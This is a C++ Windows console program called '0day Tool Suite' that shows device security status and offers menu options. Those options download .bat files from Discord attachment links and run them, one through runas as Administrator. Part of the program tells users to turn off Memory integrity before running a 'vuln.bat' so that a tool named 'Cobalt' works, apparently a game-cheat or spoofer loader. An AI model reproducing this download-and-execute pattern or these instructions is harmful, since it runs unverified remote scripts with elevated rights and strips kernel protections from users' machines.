#include <iostream>
#include <string>
#include <windows.h>
#include <cstdlib>


using namespace std;

string executeAndReturn(string command) {
    string data;
    FILE* stream;
    const int max_buffer = 256;
    char buffer[max_buffer];
    command.append(" 2>&1");

    stream = _popen(command.c_str(), "r");
    if (stream) {
        while (!feof(stream))
            if (fgets(buffer, max_buffer, stream) != NULL) data.append(buffer);
        _pclose(stream);
    }
    return data;
}

string trimEnd(string str) {
    size_t endpos = str.find_last_not_of(" \t\n\r");
    if (string::npos != endpos) {
        str = str.substr(0, endpos + 1);
    }
    return str;
}

void setColor(int color) {
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);
}

void displayVirtualizationStatus() {
    string virtualizationData = executeAndReturn("systeminfo");
    size_t pos = virtualizationData.find("Virtualization Enabled In Firmware:");

    setColor(7);
    cout << "Virtualization: ";

    if (pos != string::npos) {
        if (virtualizationData.find("Yes", pos) != string::npos) {
            setColor(10);
            cout << "Enabled" << endl;
        }
        else if (virtualizationData.find("No", pos) != string::npos) {
            setColor(12);
            cout << "Disabled" << endl;
        }
        else {
            cout << "Information Unavailable" << endl;
        }
    }
    else {
        cout << "Information Unavailable" << endl;
    }

    setColor(7);
}

void downloadAndExecuteBatFileInNewConsole(string downloadURL, string localFileName) {
    string downloadCommand = "curl -s -o " + localFileName + " " + downloadURL;
    system(downloadCommand.c_str());

    string executeCommand = "start cmd /c " + localFileName;
    system(executeCommand.c_str());
}

void displayBaseboardInfo() {
    cout << "----------------------------------------\n";

    string productData = executeAndReturn("wmic baseboard get product");
    productData.erase(0, productData.find("\n") + 1);
    cout << "Product: " << trimEnd(productData) << endl;

    string manufacturerData = executeAndReturn("wmic baseboard get Manufacturer");
    manufacturerData.erase(0, manufacturerData.find("\n") + 1);
    cout << "Manufacturer: " << trimEnd(manufacturerData) << endl;

    string secureBootData = executeAndReturn("reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State /v UEFISecureBootEnabled");
    cout << "Secure Boot: ";
    if (secureBootData.find("0x1") != string::npos) {
        setColor(10);
        cout << "Enabled" << endl;
    }
    else if (secureBootData.find("0x0") != string::npos) {
        setColor(12);
        cout << "Disabled" << endl;
    }
    else {
        setColor(7);
        cout << "Information Unavailable" << endl;
    }

    string defenderData = executeAndReturn("sc query WinDefend");
    cout << "Windows Defender: ";
    if (defenderData.find("RUNNING") != string::npos) {
        setColor(10);
        cout << "Enabled" << endl;
    }
    else if (defenderData.find("STOPPED") != string::npos) {
        setColor(12);
        cout << "Disabled" << endl;
    }
    else {
        setColor(7);
        cout << "Information Unavailable" << endl;
    }

    displayVirtualizationStatus();

    string cpuNameData = executeAndReturn("wmic cpu get name");
    cpuNameData.erase(0, cpuNameData.find("\n") + 1);
    setColor(7);
    cout << "CPU Name: ";
    if (cpuNameData.find("Intel") != string::npos) {
        setColor(9);
    }
    else if (cpuNameData.find("AMD") != string::npos) {
        setColor(12);
    }
    cout << trimEnd(cpuNameData) << endl;

    setColor(7);
    cout << "----------------------------------------\n";
}

void downloadAndExecuteBATWithAdmin(string downloadURL, string localFileName) {
    string downloadCommand = "curl -s -o " + localFileName + " " + downloadURL;
    system(downloadCommand.c_str());
    string response;
    cout << "Do you want to run the BAT file now? (yes/no): ";
    cin >> response;
    if (response == "yes") {
        string executeCommand = "start cmd /c \"runas /user:Administrator " + localFileName + "\"";
        system(executeCommand.c_str());
    }
}

void subMenu() {
    system("cls");
    int subChoice;
    while (true) {
        cout << "========================================\n";
        cout << "Sub Menu:" << endl;
        cout << "========================================\n";
        cout << "1. Vulnerable Driver Error Solution\n";
        cout << "2. [Sub Option 2]\n";
        cout << "3. [Sub Option 3]\n";
        cout << "4. Return to Main Menu\n";
        cin >> subChoice;

        switch (subChoice) {
        case 1:
            system("cls");
            cout << "If you're experiencing the \"Vulnerable driver error occurred\" error, follow these steps:\n";
            cout << "Go to Windows Security\n";
            cout << "Open Device security\n";
            cout << "Go to Core isolation details\n";
            cout << "Turn off Memory integrity\n";
            cout << "Download and run this file\n";
            cout << "Type \"yes\" if it asks, otherwise restart your PC and try using Cobalt again\n\n";
            downloadAndExecuteBATWithAdmin("https://cdn.discordapp.com/attachments/1127468254630268988/1136057877300252732/vuln.bat", "vuln.bat");
            break;
        case 4:
            system("cls");
            return;
        default:
            cout << "Invalid choice in the sub menu!" << endl;
        }
    }
}

int main() {
    int choice;
    setColor(12);
    cout << "========================================\n";
    cout << "Welcome to the 0day Tool Suite!" << endl;
    cout << "========================================\n";
    setColor(7);

    while (true) {
        cout << "========================================\n";
        cout << "Choose an option:" << endl;
        cout << "========================================\n";
        cout << "1. Display Device Information" << endl;
        cout << "2. Download and execute BAT 1" << endl;
        cout << "3. Download and execute BAT 2" << endl;
        cout << "4. Open Sub Menu" << endl;
        cout << "5. Exit" << endl;
        cin >> choice;

        switch (choice) {
        case 1:
            displayBaseboardInfo();
            break;
        case 2:
            downloadAndExecuteBatFileInNewConsole("https://cdn.discordapp.com/attachments/1090490830948675594/1143790388637880480/w-10.txt.bat", "localFile1.bat");
            break;
        case 3:
            downloadAndExecuteBatFileInNewConsole("https://cdn.discordapp.com/attachments/1090490830948675594/1143792399500460072/TWH-HWID-CHECKER_1.1.bat", "localFile2.bat");
            break;
        case 4:
            subMenu();
            break;
        case 5:
            return 0;
        default:
            cout << "Invalid choice!" << endl;
        }
    }
    return 0;
}
